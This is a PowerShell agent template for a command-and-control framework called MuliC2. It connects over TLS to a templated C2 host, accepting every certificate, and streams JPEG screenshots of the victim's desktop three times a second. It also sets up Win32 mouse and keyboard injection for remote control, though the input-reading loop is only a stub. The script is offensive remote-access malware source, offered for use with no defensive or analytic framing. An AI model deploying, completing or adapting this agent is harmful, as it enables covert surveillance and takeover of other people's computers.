# MuliC2 VNC Screen Capture Agent - Fixed Version
# C2 Host: {{C2_HOST}}
# C2 Port: {{C2_PORT}}
# VNC Endpoint: /vnc/agent
# Generated: {{GENERATED_DATE}}

param( [string]$C2Host = "{{C2_HOST}}", [int]$C2Port = {{C2_PORT}} )

# Check if running as Administrator
function Test-Administrator {
    $currentUser = [Security.Principal.WindowsIdentity]::GetCurrent()
    $principal = New-Object Security.Principal.WindowsPrincipal($currentUser)
    return $principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
}

if (-not (Test-Administrator)) {
    Write-Host "[!] WARNING: Not running as Administrator. Input simulation may fail!" -ForegroundColor Red
    Write-Host "[!] Consider running PowerShell as Administrator for full functionality." -ForegroundColor Yellow
}

function Start-Cleanup {
    if ($global:cleanupInProgress) { return }
    $global:cleanupInProgress = $true
    $global:isRunning = $false
    
    Write-Host "`n[*] Cleaning up resources..." -ForegroundColor Yellow
    
    try {
        if ($global:sslStream) {
            $global:sslStream.Close()
            $global:sslStream.Dispose()
            $global:sslStream = $null
        }
    } catch {
        Write-Host "[!] Error closing SSL stream: $($_.Exception.Message)" -ForegroundColor Red
    }
    
    try {
        if ($global:tcpClient) {
            $global:tcpClient.Close()
            $global:tcpClient.Dispose()
            $global:tcpClient = $null
        }
    } catch {
        Write-Host "[!] Error closing TCP client: $($_.Exception.Message)" -ForegroundColor Red
    }
    
    Write-Host "[+] Cleanup completed" -ForegroundColor Green
}

# Set up cleanup on exit
Register-EngineEvent -SourceIdentifier PowerShell.Exiting -Action { Start-Cleanup } | Out-Null
$null = Register-ObjectEvent -InputObject ([System.Console]) -EventName CancelKeyPress -Action { 
    Write-Host "`n[*] Received Ctrl+C, initiating cleanup..." -ForegroundColor Yellow
    Start-Cleanup
    [System.Environment]::Exit(0)
}

$global:tcpClient = $null
$global:sslStream = $null
$global:isRunning = $true
$global:cleanupInProgress = $false
$global:lastFrameTime = Get-Date
$global:frameCounter = 0
$global:reconnectAttempts = 0
$global:maxReconnectAttempts = 5

# Load required assemblies
try {
    Add-Type -AssemblyName System.Drawing
    Add-Type -AssemblyName System.Windows.Forms
    Write-Host "[+] Required assemblies loaded" -ForegroundColor Green
} catch {
    Write-Host "[!] Failed to load assemblies: $($_.Exception.Message)" -ForegroundColor Red
    exit 1
}

# Add Win32 API definitions
Add-Type @"
using System;
using System.Runtime.InteropServices;
public class Win32API {
    [DllImport("user32.dll")]
    public static extern void mouse_event(int dwFlags, int dx, int dy, int cButtons, int dwExtraInfo);
    [DllImport("user32.dll")]
    public static extern void keybd_event(byte bVk, byte bScan, uint dwFlags, UIntPtr dwExtraInfo);
    [DllImport("user32.dll")]
    public static extern short VkKeyScan(char ch);
    [DllImport("user32.dll")]
    public static extern bool SetCursorPos(int X, int Y);
    [DllImport("user32.dll")]
    public static extern bool GetCursorPos(out POINT lpPoint);
    
    [StructLayout(LayoutKind.Sequential)]
    public struct POINT { public int X; public int Y; }
    
    public const int MOUSEEVENTF_LEFTDOWN = 0x0002;
    public const int MOUSEEVENTF_LEFTUP = 0x0004;
    public const int MOUSEEVENTF_RIGHTDOWN = 0x0008;
    public const int MOUSEEVENTF_RIGHTUP = 0x0010;
    public const int MOUSEEVENTF_MIDDLEDOWN = 0x0020;
    public const int MOUSEEVENTF_MIDDLEUP = 0x0040;
    public const int MOUSEEVENTF_WHEEL = 0x0800;
    public const uint KEYEVENTF_KEYUP = 0x0002;
}
"@

function Test-Connection {
    try {
        return ($global:tcpClient -and $global:tcpClient.Connected -and $global:sslStream -and $global:sslStream.CanWrite -and $global:sslStream.IsAuthenticated)
    } catch {
        return $false
    }
}

function Connect-ToServer {
    param([int]$timeoutMs = 15000)
    
    try {
        # VNC port is C2 port + 1000 (e.g., if C2 is 8080, VNC is 9080)
        $vncPort = $C2Port + 1000
        Write-Host "[*] Connecting to MuliC2 VNC TLS endpoint at ${C2Host}:${vncPort}..." -ForegroundColor Cyan
        
        # Clean up existing connection
        if ($global:sslStream) { 
            try { $global:sslStream.Close() } catch {}
            try { $global:sslStream.Dispose() } catch {}
            $global:sslStream = $null
        }
        if ($global:tcpClient) { 
            try { $global:tcpClient.Close() } catch {}
            try { $global:tcpClient.Dispose() } catch {}
            $global:tcpClient = $null
        }
        
        # Create new TCP client
        $global:tcpClient = New-Object System.Net.Sockets.TcpClient
        
        # Set timeouts and buffer sizes
        $global:tcpClient.ReceiveTimeout = 10000
        $global:tcpClient.SendTimeout = 15000
        $global:tcpClient.ReceiveBufferSize = 65536
        $global:tcpClient.SendBufferSize = 65536
        
        # Connect with timeout to VNC port
        Write-Host "[*] Establishing TCP connection to VNC port ${vncPort}..." -ForegroundColor Yellow
        $asyncResult = $global:tcpClient.BeginConnect($C2Host, $vncPort, $null, $null)
        $waitSuccess = $asyncResult.AsyncWaitHandle.WaitOne($timeoutMs, $false)
        
        if (-not $waitSuccess) {
            throw "TCP connection timeout after ${timeoutMs}ms"
        }
        
        $global:tcpClient.EndConnect($asyncResult)
        
        if (-not $global:tcpClient.Connected) {
            throw "TCP connection failed"
        }
        
        Write-Host "[+] TCP connection established" -ForegroundColor Green
        
        # Configure socket options
        $socket = $global:tcpClient.Client
        $socket.NoDelay = $true
        $socket.LingerState = New-Object System.Net.Sockets.LingerOption($true, 1)
        
        # Get the network stream
        $networkStream = $global:tcpClient.GetStream()
        
        # Create SSL stream with certificate validation callback
        $global:sslStream = New-Object System.Net.Security.SslStream(
            $networkStream, 
            $false, 
            ([System.Net.Security.RemoteCertificateValidationCallback] {
                param($sender, $certificate, $chain, $sslPolicyErrors)
                return $true  # Accept all certificates for C2 communication
            })
        )
        
        # Set SSL stream timeouts
        $global:sslStream.ReadTimeout = 5000
        $global:sslStream.WriteTimeout = 10000
        
        # Perform TLS handshake
        Write-Host "[*] Performing TLS handshake..." -ForegroundColor Yellow
        $global:sslStream.AuthenticateAsClient(
            $C2Host,
            $null,
            [System.Security.Authentication.SslProtocols]::Tls12 -bor [System.Security.Authentication.SslProtocols]::Tls13,
            $false
        )
        
        # Verify TLS connection
        if (-not $global:sslStream.IsAuthenticated) {
            throw "TLS authentication failed"
        }
        
        if (-not $global:sslStream.IsEncrypted) {
            throw "TLS encryption failed"
        }
        
        Write-Host "[+] TLS connection established successfully" -ForegroundColor Green
        Write-Host "[*] TLS Protocol: $($global:sslStream.SslProtocol)" -ForegroundColor Gray
        
        $global:reconnectAttempts = 0
        return $true
        
    } catch {
        Write-Host "[!] Connection failed: $($_.Exception.Message)" -ForegroundColor Red
        $global:reconnectAttempts++
        
        # Clean up failed connection
        if ($global:sslStream) { 
            try { $global:sslStream.Close() } catch {}
            try { $global:sslStream.Dispose() } catch {}
            $global:sslStream = $null
        }
        if ($global:tcpClient) { 
            try { $global:tcpClient.Close() } catch {}
            try { $global:tcpClient.Dispose() } catch {}
            $global:tcpClient = $null
        }
        
        return $false
    }
}

function Send-Frame {
    param([byte[]]$frameBytes)
    
    if (-not (Test-Connection)) {
        Write-Host "[!] Connection lost, attempting to reconnect..." -ForegroundColor Yellow
        if (-not (Connect-ToServer)) {
            return $false
        }
    }
    
    try {
        # Send frame length header (4 bytes, little endian)
        $lenBytes = [BitConverter]::GetBytes([int]$frameBytes.Length)
        $global:sslStream.Write($lenBytes, 0, 4)
        
        # Send frame data in chunks
        $chunkSize = 8192
        $totalSent = 0
        
        while ($totalSent -lt $frameBytes.Length) {
            $remainingBytes = $frameBytes.Length - $totalSent
            $currentChunkSize = [Math]::Min($chunkSize, $remainingBytes)
            
            $global:sslStream.Write($frameBytes, $totalSent, $currentChunkSize)
            $totalSent += $currentChunkSize
            
            # Flush after each chunk
            $global:sslStream.Flush()
            
            if ($remainingBytes -gt $chunkSize) {
                Start-Sleep -Milliseconds 1
            }
        }
        
        return $true
        
    } catch {
        Write-Host "[!] Frame send error: $($_.Exception.Message)" -ForegroundColor Red
        return $false
    }
}

function Invoke-MouseEvent {
    param(
        [string]$event,
        [float]$x,
        [float]$y,
        [int]$button = 0,
        [int]$deltaY = 0
    )
    
    try {
        $realScreenWidth = [System.Windows.Forms.SystemInformation]::PrimaryMonitorSize.Width
        $realScreenHeight = [System.Windows.Forms.SystemInformation]::PrimaryMonitorSize.Height
        
        # Clamp coordinates to screen bounds
        $x = [Math]::Max(0.0, [Math]::Min(1.0, $x))
        $y = [Math]::Max(0.0, [Math]::Min(1.0, $y))
        
        $px = [Math]::Round($x * $realScreenWidth)
        $py = [Math]::Round($y * $realScreenHeight)
        
        # Ensure coordinates are within screen bounds
        $px = [Math]::Max(0, [Math]::Min($px, $realScreenWidth - 1))
        $py = [Math]::Max(0, [Math]::Min($py, $realScreenHeight - 1))
        
        Write-Host "[*] Mouse ${event} at ($px, $py)" -ForegroundColor Cyan
        
        # Set cursor position
        [Win32API]::SetCursorPos($px, $py)
        Start-Sleep -Milliseconds 10
        
        switch ($event) {
            'click' {
                switch ($button) {
                    0 { 
                        [Win32API]::mouse_event([Win32API]::MOUSEEVENTF_LEFTDOWN, 0, 0, 0, 0)
                        Start-Sleep -Milliseconds 50
                        [Win32API]::mouse_event([Win32API]::MOUSEEVENTF_LEFTUP, 0, 0, 0, 0)
                    }
                    2 { 
                        [Win32API]::mouse_event([Win32API]::MOUSEEVENTF_RIGHTDOWN, 0, 0, 0, 0)
                        Start-Sleep -Milliseconds 50
                        [Win32API]::mouse_event([Win32API]::MOUSEEVENTF_RIGHTUP, 0, 0, 0, 0)
                    }
                }
            }
            'wheel' {
                [Win32API]::mouse_event([Win32API]::MOUSEEVENTF_WHEEL, 0, 0, $deltaY, 0)
            }
        }
        
    } catch {
        Write-Host "[!] Mouse event failed: $($_.Exception.Message)" -ForegroundColor Red
    }
}

# Main execution
try {
    # Initial connection attempt
    if (-not (Connect-ToServer)) {
        Write-Host "[!] Initial connection failed, retrying..." -ForegroundColor Red
        Start-Sleep -Seconds 2
        if (-not (Connect-ToServer)) {
            Write-Host "[!] All connection attempts failed" -ForegroundColor Red
            exit 1
        }
    }
    
    # FIXED: Use consistent target resolution
    $realScreenWidth = [System.Windows.Forms.SystemInformation]::PrimaryMonitorSize.Width
    $realScreenHeight = [System.Windows.Forms.SystemInformation]::PrimaryMonitorSize.Height
    $targetWidth = 800   # Fixed target width
    $targetHeight = 600  # Fixed target height
    
    Write-Host "[*] Starting VNC agent..." -ForegroundColor Cyan
    Write-Host "[*] Screen: ${realScreenWidth}x${realScreenHeight} -> ${targetWidth}x${targetHeight}" -ForegroundColor Gray
    Write-Host "[*] Administrator: $(Test-Administrator)" -ForegroundColor Gray
    Write-Host "[*] Frame rate: 3 FPS (every ~333ms)" -ForegroundColor Gray
    Write-Host "[*] TLS Connection: ACTIVE" -ForegroundColor Green
    Write-Host "[*] Press CTRL+C to exit gracefully" -ForegroundColor Cyan
    
    while ($global:isRunning) {
        $currentTime = Get-Date
        
        # Handle input events (simplified for this example)
        if ((Test-Connection) -and $global:sslStream.DataAvailable) {
            try {
                # Read and handle input events here
                # Implementation depends on your input protocol
            } catch {
                Write-Host "[!] Input read error: $($_.Exception.Message)" -ForegroundColor Yellow
            }
        }
        
        # FIXED: Send screen frame every ~333ms with proper dimensions
        if (($currentTime - $global:lastFrameTime).TotalMilliseconds -ge 333) {
            try {
                # Capture full screen
                $bmpFull = New-Object System.Drawing.Bitmap $realScreenWidth, $realScreenHeight
                $graphicsFull = [System.Drawing.Graphics]::FromImage($bmpFull)
                $graphicsFull.CopyFromScreen(0, 0, 0, 0, $bmpFull.Size)
                
                # FIXED: Scale to exact target resolution with high quality
                $bmp = New-Object System.Drawing.Bitmap $targetWidth, $targetHeight
                $graphics = [System.Drawing.Graphics]::FromImage($bmp)
                $graphics.InterpolationMode = [System.Drawing.Drawing2D.InterpolationMode]::HighQualityBicubic
                $graphics.SmoothingMode = [System.Drawing.Drawing2D.SmoothingMode]::HighQuality
                $graphics.PixelOffsetMode = [System.Drawing.Drawing2D.PixelOffsetMode]::HighQuality
                
                # Draw scaled image to fill entire bitmap
                $graphics.DrawImage($bmpFull, 0, 0, $targetWidth, $targetHeight)
                
                # VERIFICATION: Log bitmap dimensions before encoding
                Write-Host "[DEBUG] Created bitmap: $($bmp.Width)x$($bmp.Height)" -ForegroundColor Cyan
                
                # Convert to JPEG with good quality
                $ms = New-Object System.IO.MemoryStream
                $encoder = [System.Drawing.Imaging.Encoder]::Quality
                $encoderParams = New-Object System.Drawing.Imaging.EncoderParameters(1)
                $encoderParams.Param[0] = New-Object System.Drawing.Imaging.EncoderParameter($encoder, 75L)  # Higher quality
                $jpegCodec = [System.Drawing.Imaging.ImageCodecInfo]::GetImageEncoders() | Where-Object { $_.MimeType -eq 'image/jpeg' }
                
                $bmp.Save($ms, $jpegCodec, $encoderParams)
                $frameBytes = $ms.ToArray()
                
                # VERIFICATION: Log JPEG size
                Write-Host "[DEBUG] JPEG size: $($frameBytes.Length) bytes" -ForegroundColor Cyan
                
                # Clean up resources immediately
                $encoderParams.Dispose()
                $ms.Dispose()
                $graphics.Dispose()
                $bmp.Dispose()
                $graphicsFull.Dispose()
                $bmpFull.Dispose()
                
                # Send frame
                if (Send-Frame $frameBytes) {
                    $global:lastFrameTime = $currentTime
                    $global:frameCounter++
                    
                    if (($global:frameCounter % 10) -eq 0) {
                        Write-Host "[*] Frame #$($global:frameCounter): ${targetWidth}x${targetHeight} -> $($frameBytes.Length) bytes" -ForegroundColor Green
                    }
                } else {
                    Write-Host "[!] Failed to send frame #$($global:frameCounter + 1)" -ForegroundColor Red
                    
                    if ($global:reconnectAttempts -ge $global:maxReconnectAttempts) {
                        Write-Host "[!] Max reconnection attempts reached. Exiting..." -ForegroundColor Red
                        break
                    }
                }
                
            } catch {
                Write-Host "[!] Screen capture error: $($_.Exception.Message)" -ForegroundColor Red
                Write-Host "[!] Stack trace: $($_.ScriptStackTrace)" -ForegroundColor Red
            }
        }
        
        # Small sleep to prevent excessive CPU usage
        Start-Sleep -Milliseconds 20
        
        # Break if too many reconnection attempts
        if ($global:reconnectAttempts -ge $global:maxReconnectAttempts) {
            Write-Host "[!] Connection permanently lost. Exiting..." -ForegroundColor Red
            break
        }
    }

} catch {
    Write-Host "[!] Fatal error: $($_.Exception.Message)" -ForegroundColor Red
} finally {
    Start-Cleanup
}